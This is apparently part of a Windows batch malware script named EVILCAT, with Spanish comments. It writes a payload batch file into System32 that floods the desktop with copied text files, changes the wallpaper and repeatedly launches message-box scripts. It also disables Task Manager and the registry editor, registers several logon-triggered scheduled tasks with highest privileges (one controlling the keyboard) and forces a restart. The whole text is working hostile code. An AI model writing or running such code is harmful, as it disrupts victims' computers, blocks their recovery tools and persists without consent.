echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat

echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat

:: Cambia de nuevo el fondo de pantalla.

echo if exist "%homedrive%\Windows\System32\EVILCAT\EVILCAT_FONDO.jpg" ( >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo     reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%homedrive%\Windows\System32\EVILCAT\EVILCAT_FONDO.jpg" >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo ) else ( >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo     reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo ) >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat

:: Inicia las ventanas

echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo timeout 1 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo start %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat

:: Desactiva el adminsitrador de tareas.
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

:: Desactiva el regedit.
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

:: Crea la tarea que ejecuta EVILCAT.
SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /F /TN "EVILCAT" /TR "%homedrive%\Windows\System32\EVILCAT\EVILCAT.vbs" >nul

:: Crea la tarea que ejecuta el Script1.
SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /F /TN "EVILCAT_S1" /TR "%homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.vbs" >nul

:: Crea la tarea que ejecuta el Script2.
SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /F /TN "EVILCAT_S2" /TR "%homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.vbs" >nul

:: Crea la tarea que ejecuta el script que controla el teclado.
SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /F /TN "EVILCAT_TECLADO" /TR "%homedrive%\Windows\System32\EVILCAT\EVILCAT_TECLADO.vbs" >nul

:: Reinicia la maquina
shutdown /r /f /t 5 >nul

echo.
echo [#] Reiniciando la maquina...|
pause >nul
exit


